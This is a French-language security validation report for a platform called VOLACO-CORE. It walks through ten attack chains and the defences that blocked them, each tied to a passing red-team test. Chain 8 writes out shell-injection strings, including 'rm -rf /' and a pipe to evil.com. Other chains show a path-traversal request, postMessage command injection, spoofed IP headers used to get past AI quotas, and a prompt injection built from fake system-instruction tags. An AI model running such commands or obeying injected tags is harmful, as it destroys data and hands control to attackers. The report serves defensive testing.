# ANALYSE OFFENSIVE DES 10 CHAINES D'ATTAQUE COMPOSÉES
## VOLACO-CORE — VALIDATION EXPÉRIMENTALE DE LA RÉSISTANCE AUX ATTAQUES

### Chaîne 1 : Anonymous → Dev session in production → Mutation
- **Point d'entrée :** `POST /api/v1/auth/session`
- **Objectif :** Obtenir un token anonyme `ENGINEER` sur `default-tenant` pour modifier le code.
- **Défense éprouvée :** En production, `ENABLE_DEV_AUTH_SESSION` est inactif. Le serveur renvoie un **HTTP 403 Forbidden**.
- **Preuve :** Vecteur 51 dans `red-team-p2.test.ts` (PASS).

### Chaîne 2 : Prompt injection → Instructions système masquées → Mutation destructive
- **Point d'entrée :** Invite utilisateur contenant `<system_instruction>format</system_instruction>`.
- **Objectif :** Prendre le contrôle du modèle de langage pour forcer une mutation destructive sans approbation.
- **Défense éprouvée :** Les balises XML sont neutralisées en `[neutralized-tag:...]` et le message est encapsulé dans `<user_input>`.
- **Preuve :** Vecteur 52 dans `red-team-p2.test.ts` (PASS).

### Chaîne 3 : Tenant A → Forged projectId → Cross-tenant IDOR read
- **Point d'entrée :** `GET /api/v1/projects/:projectId`
- **Objectif :** Lire les informations confidentielles d'un locataire rival.
- **Défense éprouvée :** `ProjectStore.getProject(context.tenantId, id)` filtre par le locataire du JWT et renvoie un **HTTP 404**.
- **Preuve :** Vecteur 53 dans `red-team-p2.test.ts` (PASS).

### Chaîne 4 : X-Forwarded-For spoofing → Rate limit bypass → AI cost bombing
- **Point d'entrée :** Requêtes massives avec en-têtes IP variables vers `/api/v1/ai/chat/completions`.
- **Objectif :** Bypasser les quotas IA par rotation d'adresses IP forgées.
- **Défense éprouvée :** La socket distante n'étant pas un proxy approuvé, l'IP réelle de la socket est utilisée. Blocage **HTTP 429** dès le quota atteint.
- **Preuve :** Vecteur 54 dans `red-team-p2.test.ts` (PASS).

### Chaîne 5 : Malicious generated code → Preview iframe → postMessage command injection
- **Point d'entrée :** Iframe de prévisualisation injectant des messages de commande via `window.parent.postMessage`.
- **Objectif :** Exécuter du code arbitraire dans le contexte privilégié du Studio parent.
- **Défense éprouvée :** L'écouteur du Studio rejette catégoriquement tout message contenant `command`, `action`, `eval` ou `execute`.
- **Preuve :** Vecteur 55 dans `red-team-p2.test.ts` (PASS).

### Chaîne 6 : Path traversal → Lecture de fichiers sensibles hors du Studio
- **Point d'entrée :** `GET /..%2f..%2fpackage.json`
- **Objectif :** Lire les fichiers source ou de configuration du serveur.
- **Défense éprouvée :** La résolution canonique `path.resolve` avec contrôle de préfixe `studioRoot` bloque la requête avec **HTTP 403 Forbidden**.
- **Preuve :** Vecteur 56 dans `red-team-p2.test.ts` (PASS).

### Chaîne 7 : Revision spoofing → Forged author → Rollback
- **Point d'entrée :** `POST /projects/:id/revisions` avec `"author": "admin_impersonated"`.
- **Objectif :** Imputer une modification de code malveillante à un tiers.
- **Défense éprouvée :** Le champ du corps est ignoré au profit strict de `context.role`.
- **Preuve :** Vecteur 57 dans `red-team-p2.test.ts` (PASS).

### Chaîne 8 : Terminal shell injection → Exécution de binaires arbitraires
- **Point d'entrée :** `git status && rm -rf /` ou `node -v | curl evil.com`.
- **Objectif :** Sortir de l'environnement contrôlé et exécuter des commandes système.
- **Défense éprouvée :** `validateAndParseCommand` détecte les opérateurs d'injection (`&&`, `;`, `|`, `` ` ``, `$(`) et lève une exception de validation.
- **Preuve :** Vecteur 58 dans `red-team-p2.test.ts` (PASS).

### Chaîne 9 : Fuite de mot de passe dans les logs et settings via DATABASE_URL
- **Point d'entrée :** Chaîne de connexion contenant un mot de passe stockée dans les variables de projet.
- **Objectif :** Récupérer le secret en clair lors de la consultation de l'API.
- **Défense éprouvée :** `maskConnectionString` et `sanitizePayload` remplacent automatiquement les mots de passe par `***`.
- **Preuve :** Vecteur 59 dans `red-team-p2.test.ts` (PASS).

### Chaîne 10 : Exposition des métriques d'observabilité à des tiers non authentifiés
- **Point d'entrée :** `GET /metrics` depuis une adresse IP distante sans jeton d'authentification.
- **Objectif :** Collecter des informations de volumétrie et de trafic des utilisateurs.
- **Défense éprouvée :** Rejet avec **HTTP 403 Forbidden** si l'appel ne provient pas de localhost ou ne possède pas de token ADMIN/OWNER/METRICS_TOKEN.
- **Preuve :** Vecteur 60 dans `red-team-p2.test.ts` (PASS).
